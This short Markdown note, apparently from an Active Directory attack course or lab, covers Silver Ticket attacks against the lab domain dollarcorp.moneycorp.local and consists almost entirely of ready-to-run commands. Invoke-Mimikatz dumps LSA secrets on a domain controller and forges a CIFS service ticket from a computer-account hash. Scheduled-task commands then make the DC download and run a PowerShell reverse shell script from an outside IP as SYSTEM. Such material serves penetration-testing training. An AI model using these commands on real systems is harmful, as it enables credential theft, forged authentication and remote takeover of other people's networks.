# Silver Ticket

## Invoke-Mimikatz
### Execute mimikatz on DC as DA to get krbtgt hash
```powershell
Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername dcorp-dc
```

### Using hash of the Domain Controller computer account, below command provides access to shares on the DC
```powershell
Invoke-Mimikatz -Command '"kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-268341927-4156871508-1792461683 /target:dcorp-dc.dollarcorp.moneycorp.local /service:CIFS /rc4:6f5b5acaf7433b3282ac22e21e62FF22 /user:Administrator /ptt"'
```
```ad-note
Similar command can be used for any other service on a machine.
Which services? HOST, RPCSS, WSMAN and many more.
```

### Schedule and execute a task
```powershell
schtasks /create /S dcorp-dc.dollarcorp.moneycorp.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "STCheck" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://192.168.100.1:8080/Invoke-PowerShellTcp.psi''')'"

schtasks /Run /S dcorp-dc.dollarcorp.moneycorp.local /TN "STCheck"
```
